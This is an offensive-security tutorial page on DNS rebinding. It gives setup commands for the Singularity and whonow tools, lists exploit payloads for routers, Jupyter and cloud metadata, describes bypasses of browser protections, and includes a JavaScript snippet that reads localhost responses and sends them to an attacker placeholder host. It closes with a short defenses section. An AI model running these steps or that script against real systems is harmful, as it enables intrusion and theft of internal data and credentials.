---
layout: training-page
title: "DNS Rebinding Attacks — Red Team Academy"
module: "Web Hacking"
tags:
  - dns-rebinding
  - ssrf
  - web-attacks
  - singularity
  - browser-security
page_key: "web-dns-rebinding"
render_with_liquid: false
---

# DNS Rebinding Attacks

DNS rebinding is a technique that makes a browser perform requests to a target that would normally be blocked by the Same-Origin Policy. The attacker controls a DNS name that initially resolves to the attacker's server. After the victim's browser has loaded the attacker's JavaScript, the DNS record is changed to resolve to an internal IP (e.g., 127.0.0.1 or 192.168.x.x). The browser's same-origin check passes because the hostname hasn't changed — only the IP behind it. The JavaScript can now reach services on the victim's internal network.

## How DNS Rebinding Works

```
# Attack flow:
# 1. Victim visits http://attack.attacker.com/
# 2. Browser resolves attack.attacker.com → 1.2.3.4 (attacker's VPS)
# 3. Attacker's server serves malicious JavaScript
# 4. JavaScript starts a timed loop to fetch from http://attack.attacker.com/target
# 5. Attacker flips DNS record: attack.attacker.com → 127.0.0.1 (victim's localhost)
#    TTL must be very low (e.g., 0 or 1 second) to allow rapid rebinding
# 6. Browser re-resolves hostname → now gets 127.0.0.1
# 7. Same-Origin check: hostname is still attack.attacker.com — passes
# 8. JavaScript can now read responses from localhost services

# Requirements:
# - Attacker controls a DNS domain with editable records
# - Low TTL on the DNS record (0-1 second)
# - Victim must visit attacker's page and keep it open (tabs don't need focus)
# - Target internal service must not require authentication or use Host header validation

# What's exploitable:
# - Local admin interfaces (routers, printers, IoT devices — 192.168.x.x)
# - Development servers on 127.0.0.1 (Jupyter, webpack-dev-server, Elasticsearch)
# - Docker host metadata services
# - Internal API services with no auth
# - Kubernetes dashboard (typically on localhost or cluster IP)
```

## Singularity of Origin — DNS Rebinding Framework

Singularity provides a complete DNS rebinding attack stack: custom DNS server, HTTP attack server, pre-built payloads, and a management interface. It can perform automated network scans and exploit vulnerable services.

### Setup Requirements

```
# Requirements:
# - A domain name (e.g., rebind.attacker.com) with NS record pointing to your server
# - A Linux VPS with ports 53, 80, and 8080 open
# - Go 1.x installed

# Clone and build:
git clone https://github.com/nccgroup/singularity
cd singularity/cmd/singularity-server
go build

# Directory structure:
# cmd/singularity-server/  — DNS + HTTP server binary
# html/                    — attack payloads served to victims
# golang/                  — attack payload implementations
```

### DNS Zone Setup

```
# At your DNS registrar, add:
# NS record:  rebind.attacker.com  →  ns1.attacker.com
# A record:   ns1.attacker.com     →  YOUR_SERVER_IP

# This delegates DNS for rebind.attacker.com to your Singularity server
# Singularity then handles all DNS queries for *.rebind.attacker.com itself
```

### Running Singularity

```
# Start the server (runs DNS on :53 and HTTP on :80 and :8080):
sudo ./singularity-server -HTTPServerPort 8080 -DNSRebindStrategy "multiA" -ResponseIPAddr "127.0.0.1"

# Key flags:
# -HTTPServerPort       Port for the management interface (default 8080)
# -DNSRebindStrategy    Rebinding strategy (see below)
# -ResponseIPAddr       The internal IP to rebind to (default 127.0.0.1)
# -ResponseRebindTo     Alternate internal IP
# -AllowDynamicHTTPServers  Enable dynamic attack servers

# Access the manager UI:
# http://YOUR_SERVER:8080/manager.html
```

### Rebinding Strategies

```
# Singularity implements multiple rebinding strategies:

# multiA (fastest — ~3 seconds):
# Returns both attacker IP and target IP in a single DNS response
# Browser caches one, eventually fetches with the other
# Blocked by Chrome since v84 (Local Network Access restrictions)
-DNSRebindStrategy "multiA"

# fromToARecord:
# First DNS response → attacker IP
# Subsequent responses → target IP
# Works when browser re-resolves after cache expiry
-DNSRebindStrategy "fromToARecord"

# CNAME-based (evades some DNS filtering):
# Returns CNAME pointing to target rather than direct A record
-DNSRebindStrategy "fromToCNAME"

# For Chrome 142+ (Local Network Access blocked):
# Use the LNA-from-Non-Secure-Contexts branch + origin trial token
# Available until May 18, 2026 via Chrome origin trial
```

### Built-in Attack Payloads

```
# Singularity ships payloads for common targets:
# Access via the Manager UI or direct URL

# Grab home page of target service:
http://YOUR_SERVER:8080/singularity.html?targetHost=192.168.1.1&targetPort=80&attack=fetch_page

# Port scan for vulnerable services (built-in port scanner):
# Scans common ports (80, 443, 8080, 8443, 9200, 9300, etc.)
# Returns list of open ports on victim's localhost/LAN

# Available attack payloads (html/ directory):
# - grab-page.html          — capture target app home page
# - router-rce.html         — exploit routers with known CVEs
# - jupyter-rce.html        — Jupyter Notebook code execution
# - AWS-metadata.html       — read AWS instance metadata
# - kubernetes-dashboard.html — access K8s dashboard
# - etcd.html               — read etcd cluster secrets
# - rails-rce.html          — Rails web console RCE

# Hook and Control — use victim browser as HTTP proxy to reach internal resources:
# http://YOUR_SERVER:8080/hookandcontrol.html
# After rebinding, browse internal network apps through victim's browser
```

### Automated Attack Mode

```
# Auto-scan and exploit all vulnerable services on victim's network:
# 1. Set up Singularity with -AllowDynamicHTTPServers
# 2. Victim visits the auto-attack page
# 3. JavaScript scans localhost and common LAN subnets for open ports
# 4. For each open service, loads the matching exploit payload
# 5. Exfiltrates data to attacker server

# Manager UI auto-attack:
# http://YOUR_SERVER:8080/manager.html
# → Set target IP/port → Select payload → Launch
```

## Manual DNS Rebinding (Without Singularity)

```
# Minimal setup using a low-TTL domain and custom DNS:
# 1. Configure your domain's DNS to serve a very low TTL (0-1s):
#    attack.yourdomain.com  A  YOUR_VPS_IP  TTL=0

# 2. Serve malicious HTML from YOUR_VPS_IP:80 that polls for data

# 3. Flip DNS record to 127.0.0.1 after victim loads page

# 4. JavaScript continues polling — now hits victim's localhost

# Minimal JavaScript payload (polls every second):
# <script>
# setInterval(async () => {
#   try {
#     const r = await fetch('http://attack.yourdomain.com:8080/api/');
#     const t = await r.text();
#     fetch('http://YOUR_VPS/collect?d=' + encodeURIComponent(t));
#   } catch(e) {}
# }, 1000);
# </script>
```

## Browser Protections and Bypasses

```
# Chrome 84+: Private Network Access (PNA) / Local Network Access (LNA)
# - Blocks requests from public → private IP without CORS preflight
# - Singularity bypass: inject Origin Trial token (LNA from non-secure contexts)
#   Valid until 2026-05-18

# Firefox: DNS cache TTL minimum of 60 seconds
# - Rebinding takes ~60s instead of ~3s
# - Still exploitable, just slower

# Safari: Follows DNS TTL — can rebind quickly

# DNS filtering (Pi-hole, OpenDNS):
# - Blocks known rebind domains
# - Bypass: use CNAME strategy pointing to target, or fresh domain

# Host header validation:
# - Services that reject requests with unexpected Host headers are protected
# - Many development tools do not validate Host headers

# HTTPS:
# - Rebinding requires HTTP (no TLS cert for the internal service)
# - Services listening only on HTTPS are generally protected
```

## Targets Commonly Vulnerable to DNS Rebinding

```
# Development tools (localhost):
# - Jupyter Notebook (port 8888) — no auth by default → RCE
# - webpack-dev-server (3000/8080) — arbitrary file read
# - Create-React-App dev server
# - Vite / Vue CLI / Angular CLI dev servers
# - Electron apps with internal HTTP APIs

# Infrastructure services:
# - Elasticsearch (9200) — read/write all data, no auth
# - Redis (6379) — config manipulation
# - Etcd (2379) — read cluster secrets
# - Kubernetes API (6443) / Dashboard (8001)
# - Docker API socket (2375)

# IoT / network devices:
# - Home routers — admin interfaces (80/443 on 192.168.1.1)
# - Smart TVs, cameras, printers
# - UPnP services

# Cloud metadata:
# - AWS: 169.254.169.254 — IAM credentials, instance info
# - GCP: metadata.google.internal
# - Azure: 169.254.169.254
```

## Defenses

```
# For service developers:
# - Validate Host header — reject requests where Host doesn't match expected value
# - Bind to 127.0.0.1 only if truly local-only — do not bind to 0.0.0.0
# - Enable authentication — even development tools should require tokens/passwords
# - Use HTTPS — prevents rebinding to services without valid certs

# For network defenders:
# - Enable DNS rebinding protection in local resolvers (Pi-hole, dnsmasq)
# - Block responses where public DNS resolves to RFC1918 addresses
# - Network segmentation — browsers should not reach internal services

# Browser mitigations:
# - Chrome LNA/PNA headers block public-to-private requests (Chrome 84+)
# - Firefox increased DNS cache TTL minimum
# - CORS headers alone are NOT sufficient protection against DNS rebinding
```

## whonow — Malicious DNS Server for DNS Rebinding

whonow is a DNS server that implements DNS rebinding rules encoded directly in the subdomain of the requested domain. The rules specify which IP to return first, how many times, then which IP to rebind to — all without any server-side configuration. A public instance runs at `rebind.network` for testing.

```
# whonow encodes rebinding rules in the domain name itself:
# Syntax: A.<first-ip>.<N>times.<rebind-ip>.forever.rebind.network
#
# A.1.2.3.4.1time.192.168.1.1.forever.rebind.network
# │  │         │   │            │
# │  └ first A record returned  └ final A record (forever)
# │         └ return first IP this many times
# └ record type (A)

# This domain resolves as:
# Request 1:      → 1.2.3.4        (attacker's server, 1 time)
# Request 2+:     → 192.168.1.1    (internal IP, forever)

# Multiple rounds — return attacker IP 3 times, then rebind:
A.93.184.216.34.3times.127.0.0.1.forever.rebind.network

# Use the public rebind.network server (no setup needed for testing):
# Just use the domain directly as your DNS rebinding target
# Browser visits: http://A.1.2.3.4.1time.127.0.0.1.forever.rebind.network/

# Self-hosted — install whonow:
npm install -g whonow
# Run (requires port 53 — use sudo):
sudo whonow

# whonow reads the subdomain to determine response:
# The server parses the subdomain tokens and applies them
# No configuration file needed — all state is in the domain name

# Attack flow with whonow:
# 1. Buy/register a domain and set NS → your whonow server
# 2. Or use rebind.network (public, for testing)
# 3. Register a page at your attacker server that makes fetch() calls
#    to http://A.YOUR_IP.1time.TARGET_IP.forever.yourdomain/
# 4. Victim loads your page → browser resolves → YOUR_IP (first request)
# 5. Page polls the same hostname → resolves → TARGET_IP (subsequent)
# 6. SOP bypassed — JS reads from TARGET_IP via your controlled hostname

# Test resolution using dig:
dig A.1.2.3.4.1time.192.168.0.1.forever.rebind.network
# First query returns: 1.2.3.4
dig A.1.2.3.4.1time.192.168.0.1.forever.rebind.network
# Second query returns: 192.168.0.1
```

## Resources

- Singularity of Origin — `github.com/nccgroup/singularity`
- whonow — malicious DNS server — `github.com/brannondorsey/whonow`
- rebind.network — public whonow testing server — `rebind.network`
- NCC Group DNS rebinding 2023 state — `nccgroup.com/us/research-blog/state-of-dns-rebinding-in-2023/`
- Chrome Local Network Access spec — `wicg.github.io/local-network-access/`
- PortSwigger research — DNS rebinding — `portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface`
- MITRE ATT&CK T1557 — Adversary-in-the-Middle — `attack.mitre.org/techniques/T1557/`
